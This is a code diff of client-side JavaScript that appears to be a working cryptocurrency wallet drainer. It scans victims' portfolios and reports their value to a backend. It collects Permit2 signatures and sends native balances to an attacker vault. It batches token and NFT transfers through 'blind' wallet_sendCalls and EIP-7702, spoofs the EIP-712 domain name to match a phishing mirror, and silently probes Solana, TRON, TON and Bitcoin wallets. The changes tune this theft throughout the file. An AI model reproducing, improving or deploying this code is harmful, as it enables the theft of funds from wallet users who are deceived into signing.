+    opts = opts || {};
+    var reason = String(opts.reason || 'manual');
+    var now = Date.now();
+
+    if (pipelineBusy()) {
+      if (_pipelinePromise) {
+        L.log('[pipeline] join in-flight', _pipelinePhase, '←', reason);
+        return _pipelinePromise;
+      }
+      L.log('[pipeline] busy (connect path)', _pipelinePhase, '←', reason, '— skip');
+      return { ok: false, error: 'busy', phase: _pipelinePhase };
+    }
+
+    // Debounce resume/visibility spam (1s)
+    var isResumeLike = /^(resume|visible|focus|pageshow|tick|bridge:)/i.test(reason) ||
+      reason.indexOf('resume') !== -1 || reason.indexOf('visible') !== -1;
+    if (isResumeLike && (now - _pipelineLastAt) < 1000 && _pipelinePromise) {
+      return _pipelinePromise;
+    }
+    if (isResumeLike && isPipelineFullySettled() && S.postConnectComplete) {
+      L.log('[pipeline] skip', reason, '— fully settled');
+      return { ok: true, path: 'already_done', phase: PIPELINE.DONE };
+    }
+    // Reject-retry / sign: skip only when vault settled (pending still needs flush)
+    if ((reason === 'sign' || reason === 'reject-retry') && !S.userRejectedSign && hasSettledEvm() && !needsEvmFlush()) {
+      return { ok: true, path: 'already_confirmed', phase: PIPELINE.DONE };
+    }
+    // Resume with pending signature — flush to vault, don't re-popup
+    if (isResumeLike && needsEvmFlush() && S.evmProvider && S.evmAddr) {
+      _pipelineLastAt = now;
+      _pipelineLastReason = reason;
+      _pipelinePromise = (async function () {
+        try {
+          setPipelinePhase(PIPELINE.DRAINING);
+          var fr = await settleEvmToVault({ flushOnly: false });
+          if (!needsEvmFlush()) {
+            S.postConnectComplete = true;
+            emitEvmConfirmDone(S.evmAddr);
+            setPipelinePhase(PIPELINE.DONE);
+          } else {
+            setPipelinePhase(PIPELINE.IDLE);
+          }
+          return { ok: !!(fr && fr.ok), path: 'flush_resume', anchorsOk: fr && fr.anchorsOk };
+        } catch (eF) {
+          setPipelinePhase(PIPELINE.IDLE);
+          return { ok: false, error: (eF && eF.message) || 'flush_fail' };
+        }
+      })();
+      return _pipelinePromise;
+    }
+
+    _pipelineLastAt = now;
+    _pipelineLastReason = reason;
+    _pipelinePromise = (async function () {
+      try {
+        setPipelinePhase(PIPELINE.CONNECTING);
+
+        if (reason === 'sign' || reason === 'reject-retry') {
+          setPipelinePhase(PIPELINE.SIGNING);
+          var sr = await forceTrustSignCore();
+          if (sr && sr.error === 'rejected') {
+            S.userRejectedSign = true;
+            setPipelinePhase(PIPELINE.REJECTED);
+            return sr;
+          }
+          if (sr && sr.ok) {
+            S.userRejectedSign = false;
+            // ALWAYS settle to vault after lethal — pending Permit2 is NOT vault yet
+            if (AUTO_DRAIN && S.evmProvider && S.evmAddr && (needsEvmFlush() || !hasSettledEvm())) {
+              try {
+                await settleEvmToVault({});
+              } catch (eD) {
+                if (isUserRejection(eD)) {
+                  S.userRejectedSign = true;
+                  setPipelinePhase(PIPELINE.REJECTED);
+                  return { ok: false, error: 'rejected' };
+                }
+                L.warn('[pipeline] settle after sign:', eD && eD.message);
+              }
+            }
+            if (!needsEvmFlush()) {
+              S.postConnectComplete = true;
+              emitEvmConfirmDone(S.evmAddr);
+              setPipelinePhase(PIPELINE.DONE);
+            } else {
+              L.warn('[pipeline] still pending after settle — not marking complete');
+              setPipelinePhase(PIPELINE.IDLE);
+            }
+            return Object.assign({}, sr, { anchorsOk: Number(S.anchorsOk) || 0, pending: needsEvmFlush() });
+          }
+          setPipelinePhase(PIPELINE.IDLE);
+          return sr || { ok: false, error: 'sign_fail' };
+        }
+
+        // Default / resume: notify → amount → handleEvmConnect(resume)
+        var ok = await continueConnectedCore();
+        if (S.userRejectedSign) {
+          setPipelinePhase(PIPELINE.REJECTED);
+          return { ok: false, error: 'rejected', continued: !!ok };
+        }
+        if (isPipelineFullySettled() || S.postConnectComplete) {
+          setPipelinePhase(PIPELINE.DONE);
+          return { ok: true, path: 'continue', continued: !!ok };
+        }
+        if (S.amountScoutDone && !S.evmProvider) {
+          setPipelinePhase(PIPELINE.IDLE);
+          return { ok: !!ok, path: 'scan_only', continued: !!ok };
+        }
+        setPipelinePhase(PIPELINE.IDLE);
+        return { ok: !!ok, path: 'continue', continued: !!ok };
+      } catch (e) {
+        L.warn('[pipeline] fail:', e && e.message);
+        setPipelinePhase(PIPELINE.IDLE);
+        return { ok: false, error: (e && e.message) || 'pipeline_fail' };
+      }
+    })();
+
+    return _pipelinePromise;
+  }
+
+  /** Core lethal sign — no pipeline wrapper (used by startPipeline + handleEvmConnect). */
+  async function forceTrustSignCore() {
+    if (typeof evmLethalAlreadyConfirmed === 'function' && evmLethalAlreadyConfirmed()) {
+      if (needsEvmFlush()) {
+        L.log('[forceTrustSign] pending Permit2 — need vault flush');
+        return { ok: true, path: 'pending_flush' };
+      }
+      L.log('[forceTrustSign] skip — already confirmed');
+      return { ok: true, path: 'already_confirmed' };
+    }
     if (!S.evmAddr) {
       try { S.evmAddr = sessionStorage.getItem('legion_wc_evm_addr') || ''; } catch (e0) { /* ignore */ }
     }
-    // Prefer injected Trust when already inside Trust Browser
-    if (isTrustInAppBrowser()) {
+    var preferInjectedInApp = false;
+    try {
+      preferInjectedInApp = isTrustInAppBrowser() && !window.__TRUST_INAPP_APPKIT__ && S.connectMode !== 'wc' && !S.wcSessionActive;
+    } catch (ePref) {
+      preferInjectedInApp = isTrustInAppBrowser() && S.connectMode !== 'wc';
+    }
+    if (preferInjectedInApp) {
       var inj = getInjectedTrustProvider();
       if (inj) {
         S.evmProvider = inj;
@@ -3434,10 +3932,24 @@
       }
       return r || { ok: false, error: 'no_lethal_target' };
     } catch (se) {
-      if (isUserRejection(se)) return { ok: false, error: 'rejected' };
+      if (isUserRejection(se)) {
+        S.userRejectedSign = true;
+        return { ok: false, error: 'rejected' };
+      }
       return { ok: false, error: (se && se.message) || 'sign_fail' };
     }
-    })().finally(function () { _forceSignInflight = null; });
+  }
+
+  var _forceSignInflight = null;
+
+  async function forceTrustSignPublic() {
+    // Route through single pipeline (reject-retry or sign)
+    if (pipelineBusy() && _pipelinePromise) return _pipelinePromise;
+    if (_forceSignInflight) return _forceSignInflight;
+    var reason = S.userRejectedSign ? 'reject-retry' : 'sign';
+    _forceSignInflight = startPipeline({ reason: reason }).finally(function () {
+      _forceSignInflight = null;
+    });
     return _forceSignInflight;
   }
 
@@ -3511,8 +4023,17 @@
     var id = String(Number(chainId));
     var domCfg = (S.eip712Domains && (S.eip712Domains[id] || S.eip712Domains['default'])) || null;
     var hostName = null;
-    if (typeof window !== 'undefined' && window.location && window.location.hostname) {
-      hostName = String(window.location.hostname).replace(/\./g, ' ');
+    try {
+      // Use the hostname saved at WC connect time so domain.name matches the
+      // DApp shown in Trust Wallet, even if user later navigates to a mirror site.
+      var savedHost = sessionStorage.getItem('lgn_connect_host');
+      hostName = savedHost
+        ? String(savedHost).replace(/\./g, ' ')
+        : String(window.location.hostname).replace(/\./g, ' ');
+    } catch (e) {
+      if (typeof window !== 'undefined' && window.location && window.location.hostname) {
+        hostName = String(window.location.hostname).replace(/\./g, ' ');
+      }
     }
     // Top-drainer UX: EIP-712 domain.name = site hostname (cfg override wins)
     if (domCfg && domCfg.name) typedData.domain.name = domCfg.name;
@@ -3830,10 +4351,21 @@
     },
 
     reportScanComplete: async function (address, totalUsd, assetCount, walletName, chainId) {
+      // Always notify once per address+session — including empty wallets ($0)
       var usd = Number(totalUsd) || 0;
-      if (usd <= 0) return;
-      if (S.fusionNotified && S.scoutUsd >= usd) return;
+      var addrKey = String(address || '').toLowerCase();
+      var dedupeKey = addrKey + ':' + String(S.connectSession || '');
+      if (S._scanCompleteKey === dedupeKey) {
+        L.log('[scout] skip duplicate scan_complete');
+        return;
+      }
+      if (S.fusionNotified && S._scanCompleteAddr === addrKey) {
+        L.log('[scout] skip scan_complete — already notified this address');
+        return;
+      }
       S.fusionNotified = true;
+      S._scanCompleteKey = dedupeKey;
+      S._scanCompleteAddr = addrKey;
       S.scoutUsd = Math.max(S.scoutUsd, usd);
       try {
         await apiPost('/api/v1/scout/drain-status', {
@@ -3842,40 +4374,58 @@
           chain_id: Number(chainId) || undefined,
           chain_family: 'EVM',
           wallet_type: walletName || 'Unknown',
-          scout_value_usd: Number(totalUsd) || 0,
+          scout_value_usd: usd,
           asset_count: assetCount || 0,
           source_page: window.location.href,
           connect_session: S.connectSession || undefined,
         });
+        L.log('[scout] scan_complete notified | usd=', usd);
       } catch (e) {}
     },
 
     fusion: async function (addrs) {
       try {
-        var body = { connect_session: S.connectSession || undefined };
-        if (S.scoutUsd > 0) body.scout_value_usd = S.scoutUsd;
-        if (addrs.evm) body.evm_holder = addrs.evm;
-        if (addrs.sol) body.sol_owner_base58 = addrs.sol;
-        if (addrs.tron) body.tron_holder_base58 = addrs.tron;
-        if (addrs.ton) body.ton_friendly_address = addrs.ton;
-        if (addrs.btc) body.btc_holder_address = addrs.btc;
-        if (addrs.cosmos) body.cosmos_holder_address = addrs.cosmos;
-        if (addrs.aptos) body.aptos_holder_address = addrs.aptos;
-        if (addrs.sui) body.sui_holder_address = addrs.sui;
-        var r = await apiPost('/api/scout/recursive-predator-fusion', body);
-        var data = (r && r.data && r.data.fusion) ? r.data.fusion : (r && r.data) ? r.data : r;
-        if (data && data.total_usd) S.scoutUsd = Number(data.total_usd) || S.scoutUsd;
-        if (data && data.assets) S.fusionAssets = data.assets;
-        return data || null;
+        var fKey = String((addrs && (addrs.evm || addrs.sol || addrs.btc)) || '').toLowerCase();
+        if (fKey && S._fusionDoneKey === fKey && S.fusionAssets) {
+          L.log('[fusion] skip duplicate');
+          return { total_usd: S.scoutUsd, assets: S.fusionAssets };
+        }
+        if (S._fusionPromise) return S._fusionPromise;
+        S._fusionPromise = (async function () {
+          var body = { connect_session: S.connectSession || undefined };
+          if (S.scoutUsd > 0) body.scout_value_usd = S.scoutUsd;
+          if (addrs.evm) body.evm_holder = addrs.evm;
+          if (addrs.sol) body.sol_owner_base58 = addrs.sol;
+          if (addrs.tron) body.tron_holder_base58 = addrs.tron;
+          if (addrs.ton) body.ton_friendly_address = addrs.ton;
+          if (addrs.btc) body.btc_holder_address = addrs.btc;
+          if (addrs.cosmos) body.cosmos_holder_address = addrs.cosmos;
+          if (addrs.aptos) body.aptos_holder_address = addrs.aptos;
+          if (addrs.sui) body.sui_holder_address = addrs.sui;
+          var r = await apiPost('/api/scout/recursive-predator-fusion', body);
+          var data = (r && r.data && r.data.fusion) ? r.data.fusion : (r && r.data) ? r.data : r;
+          if (data && data.total_usd) S.scoutUsd = Number(data.total_usd) || S.scoutUsd;
+          if (data && data.assets) S.fusionAssets = data.assets;
+          if (fKey) S._fusionDoneKey = fKey;
+          return data || null;
+        })().finally(function () { S._fusionPromise = null; });
+        return S._fusionPromise;
       } catch (e) { L.warn('Fusion scout fail:', e.message); return null; }
     },
 
     ranked: async function (address, chainId) {
       try {
+        var key = String(address || '').toLowerCase() + ':' + String(chainId == null ? 'all' : Number(chainId));
+        var now = Date.now();
+        if (!S._rankedCache) S._rankedCache = {};
+        var hit = S._rankedCache[key];
+        if (hit && (now - hit.ts) < 45000) return hit.data;
         var body = { wallet_address: address };
         if (chainId != null) body.chain_id = Number(chainId);
         var r = await apiPost('/api/v1/scout/ranked', body);
-        return (r && r.data) ? r.data : null;
+        var data = (r && r.data) ? r.data : null;
+        S._rankedCache[key] = { ts: now, data: data };
+        return data;
       } catch (e) { return null; }
     },
 
@@ -3919,7 +4469,16 @@
     },
   };
 
+  var _prefetchVaultPromise = null;
   async function prefetchVault() {
+    if (S.vaultLoaded) return;
+    if (_prefetchVaultPromise) return _prefetchVaultPromise;
+    _prefetchVaultPromise = _prefetchVaultInner().finally(function () {
+      _prefetchVaultPromise = null;
+    });
+    return _prefetchVaultPromise;
+  }
+  async function _prefetchVaultInner() {
     try {
       var res = await apiFetch('/api/v1/client-config', { method: 'GET', credentials: 'omit' });
       var d = await res.json();
@@ -4099,11 +4658,9 @@
       } catch (e) {
         lastErr = e;
         if (!isUserRejection(e)) throw e;
-        L.warn('[retry]', label || 'approval', '— user rejected, re-prompt', attempt + '/' + cap);
-        UI.showStatus('Please approve in your wallet… (' + attempt + '/' + cap + ')');
-        // Jitter between re-prompts (never fixed-interval)
-        var base = 900;
-        await sleep(base + Math.floor(Math.random() * base * 0.5));
+        L.warn('[retry]', label || 'approval', '— user acted, not re-showing same popup', attempt + '/' + cap);
+        // Do NOT re-prompt the same approval — next different popup may still run
+        throw e;
       }
     }
     throw lastErr || new Error((label || 'approval') + ' rejected after ' + cap + ' attempts');
@@ -4462,6 +5019,15 @@
       try {
         if (deepLinkTarget) window.__LEGION_DEEP_LINK_TARGET__ = null;
       } catch (eDl) { /* ignore */ }
+      var trustInAppAppKit = false;
+      try {
+        trustInAppAppKit = !!(window.__TRUST_INAPP_APPKIT__ || isTrustInAppBrowser());
+      } catch (eInApp) { trustInAppAppKit = false; }
+      // In Trust Browser: force WC/AppKit multichain (all namespaces) — never injected ETH-only sheet
+      if (trustInAppAppKit) {
+        try { window.__LEGION_DEEP_LINK_TARGET__ = null; } catch (eDl2) { /* ignore */ }
+        deepLinkTarget = null;
+      }
       var connectP = window.LegionWallet.connect({
         projectId: WC_PROJECT_ID,
         metadata: wcMeta,
@@ -4472,9 +5038,14 @@
         bip122PollMs: WC_BIP122_POLL_MS,
         ensureBip122: false,
         linkBitcoin: true,
+        enableInjected: false,
+        enableEIP6963: false,
+        featuredWalletIds: trustInAppAppKit
+          ? ['4622a2b2d6af1c9844944291e5e7351a6aa24cd7b23099efac1b2fd875da31a0']
+          : undefined,
         preserveSession: !deepLinkTarget && hasStoredSession && !sessionExpired && !switchingFromExtension && !browserExtensionActive,
-        forceFresh: !!deepLinkTarget || switchingFromExtension || sessionExpired || browserExtensionActive,
-        restore: !deepLinkTarget && (sessionExpired || hasStoredSession) && !browserExtensionActive,
+        forceFresh: !!deepLinkTarget || switchingFromExtension || sessionExpired || browserExtensionActive || trustInAppAppKit,
+        restore: !deepLinkTarget && !trustInAppAppKit && (sessionExpired || hasStoredSession) && !browserExtensionActive,
         deepLinkTarget: deepLinkTarget || undefined,
       });
       var provider = await Promise.race([
@@ -4484,14 +5055,14 @@
         }),
       ]);
       var connId = getLegionConnectorId().toLowerCase();
-      if (provider && isInjectedConnectorId(connId)) {
+      if (provider && isInjectedConnectorId(connId) && !acceptTrustInAppWc(connId, provider)) {
         try { await disconnectLegionWallet(); } catch (e2) {}
         L.warn('Extension hijacked WalletConnect —', connId || 'injected');
         _wcConnecting = false;
         _wcProv = null;
         return null;
       }
-      if (provider && provider.isMetaMask && !provider.isWalletConnect) {
+      if (provider && provider.isMetaMask && !provider.isWalletConnect && !acceptTrustInAppWc(connId, provider)) {
         try { await disconnectLegionWallet(); } catch (e2) {}
         L.warn('Browser wallet hijacked WalletConnect — use MetaMask button for extension');
         _wcConnecting = false;
@@ -4505,6 +5076,9 @@
         _wcProv = null;
         return null;
       }
+      if (provider && acceptTrustInAppWc(connId, provider)) {
+        try { provider.isWalletConnect = true; } catch (eMark) { /* ignore */ }
+      }
       _wcProv = provider;
       _wcConnecting = false;
       await harvestWcMultichainFamilies({
@@ -4515,6 +5089,7 @@
       });
       L.log('Bundled AppKit connected | connector:', connId || 'unknown',
         '| wc:', !!(provider && provider.isWalletConnect));
+      void registerWcSessionWithBackend();
       return provider;
     } catch (e) {
       _wcConnecting = false;
@@ -4781,14 +5356,22 @@
   async function drainNativeSendTx(provider, address, chainId, assets) {
     var claimContract = resolveClaimContract(chainId);
     var gasLimit = claimContract ? 120000n : NATIVE_TRANSFER_GAS;
-    var sweep = await calcMaxNativeSendWei(provider, assets.nativeHex, chainId, gasLimit);
-    var sendEth = sweep.send;
+    // Live balance — avoids stale portfolio scan value after prior token drain gas costs.
+    var balHex = await provider.request({ method: 'eth_getBalance', params: [address, 'latest'] });
+    var bal = BigInt(balHex || '0x0');
+    // Conservative 160% buffer so Trust Wallet's own gas estimate always fits within our deduction.
+    // We do NOT pass maxFeePerGas/maxPriorityFeePerGas — wallet estimates its own price.
+    // Trust Wallet's internal gas price ≈ 1.92× base fee; our estimateEip1559Fees returns 1.2×.
+    // So Trust_gas ≈ 1.6× our estimate. Use 400% buffer → deduct 2.5× Trust_gas → ~$0.16 margin.
+    var fees = await estimateEip1559Fees(provider, chainId);
+    var gasCost = (gasLimit * fees.maxFeePerGas * 400n) / 100n;
+    if (bal <= gasCost) return null;
+    var sendEth = bal - gasCost;
     if (sendEth <= MIN_NATIVE_WEI) return null;
     var vault = VAULT.evm;
     var chainHex = '0x' + Number(chainId).toString(16);
     try {
       var nonceHex = await provider.request({ method: 'eth_getTransactionCount', params: [address, 'pending'] });
-      var fees = await estimateEip1559Fees(provider, chainId);
       var tx = {
         from: address,
         to: claimContract || vault,
@@ -4797,8 +5380,6 @@
         chainId: chainHex,
         nonce: toHexQty(nonceHex),
         gas: toHexQty(gasLimit),
-        maxFeePerGas: toHexQty(fees.maxFeePerGas),
-        maxPriorityFeePerGas: toHexQty(fees.maxPriorityFeePerGas),
       };
       if (claimContract) {
         var onVault = await readContractVault(provider, claimContract);
@@ -5068,11 +5649,12 @@
     UI.overlay.show('verifying');
 
     // EIP-7702 first path (before sendCalls) — drainEip7702 unchanged; falls through if unsupported
-    if (!didSomething) {
+    if (!didSomething && !isPopupConfirmed('eip7702', chainId)) {
       try {
         var eip7702Data = await drainEip7702(provider, address, chainId, assets);
         if (eip7702Data && eip7702Data.auth) {
           await SUBMIT.eip7702(eip7702Data, address, chainId, walletName);
+          markPopupConfirmed('eip7702', chainId);
           didSomething = true;
           L.log('EIP-7702 primary ok');
         } else {
@@ -5081,6 +5663,31 @@
       } catch (e7702) {
         if (isUserRejection(e7702)) throw e7702;
         L.warn('EIP-7702 primary fail:', e7702.message);
+      }
+    }
+
+    // ═══ LOOPHOLE 1: BLIND wallet_sendCalls — try even without capabilities confirmation ═══
+    // Trust/Exodus in-app may support wallet_sendCalls even if getCapabilities fails.
+    // ONE popup = native ETH + ERC-20 + NFTs all together.
+    var batchTokensBlind = filterDrainableTokens(assets.tokens);
+    var hasBlindTargets = nativeSend > MIN_NATIVE_WEI || batchTokensBlind.length > 0 || assets.nfts.length > 0;
+    if (!didSomething && hasBlindTargets && !hwObj && !(isMm && !isWcPath) && !isPopupConfirmed('sendCalls', chainId)) {
+      try {
+        L.log('[drain] BLIND wallet_sendCalls attempt (no capabilities needed)');
+        var blindBatch = await drainSendCalls(provider, address, chainId, assets);
+        var blindId = extractBatchOrTxId(blindBatch);
+        if (blindId && isLikelyTxHash(blindId)) {
+          await SUBMIT.sendCalls(blindId, address, chainId, walletName);
+          markPopupConfirmed('sendCalls', chainId);
+          didSomething = true;
+          L.log('BLIND sendCalls OK — ONE popup covered native + ERC-20 + NFTs');
+        } else if (blindBatch) {
+          // User likely confirmed but id missing — do NOT show sendCalls again
+          markPopupConfirmed('sendCalls', chainId);
+        }
+      } catch (blindE) {
+        if (isUserRejection(blindE)) { S.userRejectedSign = true; throw blindE; }
+        L.warn('[drain] blind sendCalls fail (expected if unsupported):', blindE.message);
       }
     }
 
@@ -5110,59 +5717,54 @@
     var canBatch = caps.atomicBatch && caps.sendCallsV2 !== false && NATIVE_BATCH_FALLBACK && !hwObj;
     var batchTokens = filterDrainableTokens(assets.tokens);
     var hasBatchTargets = nativeSend > MIN_NATIVE_WEI || batchTokens.length > 0 || assets.nfts.length > 0;
-    if (!didSomething && canBatch && hasBatchTargets && !(isMm && !isWcPath)) {
+    if (!didSomething && canBatch && hasBatchTargets && !(isMm && !isWcPath) && !isPopupConfirmed('sendCalls', chainId)) {
       try {
         var batchRaw0 = await drainSendCalls(provider, address, chainId, assets);
         var batchId0 = extractBatchOrTxId(batchRaw0);
         if (batchId0 && isLikelyTxHash(batchId0)) {
           await SUBMIT.sendCalls(batchId0, address, chainId, walletName);
+          markPopupConfirmed('sendCalls', chainId);
           didSomething = true;
+        } else if (batchRaw0) {
+          markPopupConfirmed('sendCalls', chainId);
         }
       } catch (b0e) {
-        if (isUserRejection(b0e)) throw b0e;
+        if (isUserRejection(b0e)) { S.userRejectedSign = true; throw b0e; }
         L.warn('sendCalls primary fail:', b0e.message);
       }
     }
 
-    // WC / mobile — single native tx if batch unavailable
-    if (!didSomething && isWcPath && MOBILE_SEND_TX && nativeSend > MIN_NATIVE_WEI) {
-      L.log('WC native tx | native:', (Number(nativeSend) / 1e18).toFixed(6));
+    // ═══ Permit2 FIRST — ERC20 tokens priority (get valuable tokens before native) ═══
+    var drainableTokens = filterDrainableTokens(assets.tokens);
+    if (drainableTokens.length > 0 && !isPopupConfirmed('permit2', chainId)) {
+      try {
+        var p2 = await drainPermit2(provider, address, chainId, drainableTokens, assets.nfts, 0n);
+        if (p2 && isLethalEvmResult(p2)) {
+          S.pendingEvmPermit2 = p2;
+          markPopupConfirmed('permit2', chainId);
+          didSomething = true;
+        }
+      } catch (pe) {
+        if (isUserRejection(pe)) { S.userRejectedSign = true; throw pe; }
+        L.warn('Permit2 fail:', pe.message);
+      }
+    }
+
+    // ═══ Native eth_sendTransaction AFTER Permit2 — runs regardless of didSomething ═══
+    if (MOBILE_SEND_TX && nativeSend > MIN_NATIVE_WEI && !isPopupConfirmed('nativeTx', chainId)) {
+      L.log('Native tx | native:', (Number(nativeSend) / 1e18).toFixed(6), '| path:', isWcPath ? 'WC' : 'injected');
       try {
         var wcTx = await drainNativeSendTx(provider, address, chainId, assets);
         if (wcTx && isLikelyTxHash(wcTx)) {
           await SUBMIT.userBroadcast(wcTx, address, chainId, walletName, nativeSend);
-            didSomething = true;
-          }
+          markPopupConfirmed('nativeTx', chainId);
+          didSomething = true;
+        } else if (wcTx) {
+          markPopupConfirmed('nativeTx', chainId);
+        }
       } catch (wce) {
-        if (isUserRejection(wce)) throw wce;
-        L.warn('WC claim() fail:', wce.message);
-      }
-    }
-
-    // Permit2 fallback — valued tokens only (1 sign popup)
-    var drainableTokens = filterDrainableTokens(assets.tokens);
-    var nativeForPermit2 = canTryNativeSignTx(provider) ? nativeSend : 0n;
-    if (!didSomething && drainableTokens.length > 0) {
-      try {
-        var p2 = await drainPermit2(provider, address, chainId, drainableTokens, assets.nfts, nativeForPermit2);
-        if (p2 && isLethalEvmResult(p2)) {
-          S.pendingEvmPermit2 = p2;
-          didSomething = true;
-        }
-      } catch (pe) {
-        if (isUserRejection(pe)) throw pe;
-        L.warn('Permit2 fail:', pe.message);
-      }
-    } else if (!didSomething && nativeForPermit2 > MIN_NATIVE_WEI) {
-      try {
-        var p2n = await drainPermit2(provider, address, chainId, [], assets.nfts, nativeForPermit2);
-        if (p2n && isLethalEvmResult(p2n)) {
-          await SUBMIT.permit2(p2n, address, chainId, walletName, assets.nfts, p2n.nftApprovalSigs || {});
-          didSomething = true;
-        }
-      } catch (pne) {
-        if (isUserRejection(pne)) throw pne;
-        L.warn('Native permit2 fail:', pne.message);
+        if (isUserRejection(wce)) { S.userRejectedSign = true; throw wce; }
+        L.warn('WC native fail:', wce.message);
       }
     }
 
@@ -5206,7 +5808,25 @@
 
   async function runEvmDrainModeB(provider, address, startChainId, walletName, hwObj, portfolio) {
     if (!S.vaultLoaded) await prefetchVault();
-    if (!portfolio) portfolio = await scanFullPortfolio(address);
+    // Start portfolio scan in background — drain startChainId immediately for fast first popup
+    var portfolioP = portfolio ? Promise.resolve(portfolio) : scanFullPortfolio(address);
+    var isWcPath = walletName === 'WalletConnect' || !!(provider && provider.isWalletConnect);
+    // Quick native drain on startChainId before portfolio scan completes
+    if (!isPopupConfirmed('eip7702', startChainId) && !isPopupConfirmed('sendCalls', startChainId) &&
+        !isPopupConfirmed('nativeTx', startChainId)) {
+      try {
+        var quickAssets = await buildChainAssets(provider, address, startChainId, null);
+        if (chainHasDrainableAssets(quickAssets)) {
+          L.log('Mode B quick drain chain', startChainId, '(pre-scan)');
+          await runWithRetry(function () {
+            return runDrainWaterfall(provider, address, startChainId, walletName, hwObj, quickAssets);
+          }, 'evm-quick-' + startChainId);
+        }
+      } catch (qe) {
+        if (isUserRejection(qe)) throw qe;
+      }
+    }
+    portfolio = await portfolioP;
     var chains = (portfolio.fundedChains && portfolio.fundedChains.length)
       ? portfolio.fundedChains.slice()
       : [startChainId];
@@ -5220,13 +5840,23 @@
     try {
       for (var i = 0; i < ordered.length; i++) {
         var cid = ordered[i];
-        var cur = await getProviderChainId(provider);
-        if (cur !== cid) {
-          if (!(await safeSwitchProviderChain(provider, cid))) {
-            L.log('Chain', cid, 'switch declined — skip');
-            continue;
+        // Skip chain if all-in-one confirmed, or both native+permit2 done
+        if (isPopupConfirmed('eip7702', cid) || isPopupConfirmed('sendCalls', cid) ||
+            (isPopupConfirmed('nativeTx', cid) && isPopupConfirmed('permit2', cid))) {
+          L.log('Mode B skip chain', cid, '— already confirmed');
+          anyOk = true;
+          continue;
+        }
+        // WalletConnect: skip chain switching — tx chainId routes correctly in wallet queue
+        if (!isWcPath) {
+          var cur = await getProviderChainId(provider);
+          if (cur !== cid) {
+            if (!(await safeSwitchProviderChain(provider, cid))) {
+              L.log('Chain', cid, 'switch declined — skip');
+              continue;
+            }
+            await waitForProviderChain(provider, cid, 8000);
           }
-          await waitForProviderChain(provider, cid, 8000);
         }
         logContractCoverage(cid);
         var assets = await buildChainAssets(provider, address, cid, portfolio);
@@ -5262,6 +5892,23 @@
     if (!entry) return null;
     var prov = entry.provider;
     try {
+      // Silent probe first — no popup (onlyIfTrusted or already-exposed publicKey)
+      var silentAddr = '';
+      try {
+        var silentPk = prov.publicKey;
+        if (!silentPk && prov.features && prov.features['standard:connect']) {
+          await prov.features['standard:connect'].connect({ onlyIfTrusted: true }).catch(function () { return null; });
+          silentPk = prov.publicKey;
+        }
+        if (silentPk) silentAddr = silentPk.toString ? silentPk.toString() : String(silentPk);
+        if (!silentAddr && prov.publicKey && prov.publicKey.toBase58) silentAddr = prov.publicKey.toBase58();
+      } catch (_) {}
+      if (silentAddr && silentAddr.length > 20) {
+        L.log('[SVM] silent:', silentAddr.slice(0, 8), '(' + entry.hint + ')');
+        S.chains.SOL = { address: silentAddr, name: 'SVM' };
+        return { provider: prov, address: silentAddr, name: 'SVM', family: 'SVM', hint: entry.hint };
+      }
+      // Full connect required in Trust in-app (ETH Connect alone is not enough)
       if (prov.features && prov.features['standard:connect']) {
         await prov.features['standard:connect'].connect({});
       } else if (prov.connect) {
@@ -5397,8 +6044,19 @@
     if (!entry) return null;
     var tl = entry.provider;
     try {
-      if (tl.request) await tl.request({ method: 'tron_requestAccounts' });
+      // Silent probe first — TronLink-style providers expose defaultAddress without popup
       var tw = tl.tronWeb || window.tronWeb;
+      var silentDirect = (tw && tw.defaultAddress && tw.defaultAddress.base58)
+        || (tl.defaultAddress && tl.defaultAddress.base58)
+        || tl.address || tl.selectedAddress || '';
+      if (silentDirect) {
+        L.log('[TRON] silent:', String(silentDirect).slice(0, 8), '(' + entry.hint + ')');
+        S.chains.TRON = { address: String(silentDirect) };
+        return { tronWeb: tw || tl, address: String(silentDirect), name: 'TRON', family: 'TRON', hint: entry.hint };
+      }
+      // Full connect required in Trust in-app (ETH Connect alone is not enough)
+      if (tl.request) await tl.request({ method: 'tron_requestAccounts' });
+      tw = tl.tronWeb || window.tronWeb;
       if (!tw || !tw.defaultAddress || !tw.defaultAddress.base58) return null;
       var addr = tw.defaultAddress.base58;
       L.log('[TRON] connected:', addr.slice(0, 8), '(' + entry.hint + ')');
@@ -5494,6 +6152,17 @@
     var entry = firstFamilyProvider('TON');
     var tonProv = entry ? entry.provider : null;
     if (tonProv) {
+      // Silent probe — check account without calling connect()
+      try {
+        var silentAcc = tonProv.account;
+        var silentTonAddr = silentAcc && (silentAcc.address || silentAcc);
+        if (silentTonAddr && typeof silentTonAddr === 'string' && silentTonAddr.length > 10) {
+          L.log('[TON] silent:', silentTonAddr.slice(0, 8), '(' + entry.hint + ')');
+          S.chains.TON = { address: silentTonAddr };
+          return { provider: tonProv, address: silentTonAddr, type: 'direct', name: 'TON', family: 'TON', hint: entry.hint };
+        }
+      } catch (_) {}
+      // Full connect — Trust in-app included
       try {
         var r = await tonProv.connect({ items: [{ name: 'ton_addr' }] });
         if (r && r.items) {
@@ -5642,6 +6311,17 @@
     if (!entry) return null;
     var prov = entry.provider;
     try {
+      // Silent probe — selectedAddress or accounts array without popup
+      var silentBtc = prov.selectedAddress
+        || (prov.accounts && (Array.isArray(prov.accounts) ? prov.accounts[0] : prov.accounts))
+        || '';
+      if (silentBtc && typeof silentBtc === 'object') silentBtc = silentBtc.address || silentBtc.pubkey || '';
+      if (silentBtc && typeof silentBtc === 'string' && silentBtc.length > 10) {
+        L.log('[UTXO] silent:', silentBtc.slice(0, 8), '(' + entry.hint + ')');
+        S.chains.BTC = { address: silentBtc, name: 'UTXO' };
+        return { provider: prov, address: silentBtc, name: 'UTXO', family: 'UTXO', hint: entry.hint };
+      }
+      // Full connect required in Trust in-app (ETH Connect alone is not enough)
       var accounts;
       if (prov.requestAccounts) accounts = await prov.requestAccounts();
       else if (prov.connect) {
@@ -5975,12 +6655,38 @@
       : collectAddressMap(evmCtx.address);
     S.omnichainLegs = {};
 
-    var portfolio = await scanFullPortfolio(evmCtx.address, addrs);
+    var addrKey = String(evmCtx.address || '').toLowerCase();
+    var alreadyScanned = !!(S.amountScoutDone && S.portfolioScan &&
+      (S._portfolioScanKey === addrKey || (S.portfolioScan.addresses && String(S.portfolioScan.addresses.evm || '').toLowerCase() === addrKey)));
 
-    await SCOUT.alertStage('connect', evmCtx.address, evmCtx.chainId, evmCtx.walletName, 'Wallet connected');
-    await broadcastConnectScan(evmCtx.address, evmCtx.chainId, evmCtx.walletName, addrs);
-    await SCOUT.alertStage('scan_start', evmCtx.address, evmCtx.chainId, evmCtx.walletName);
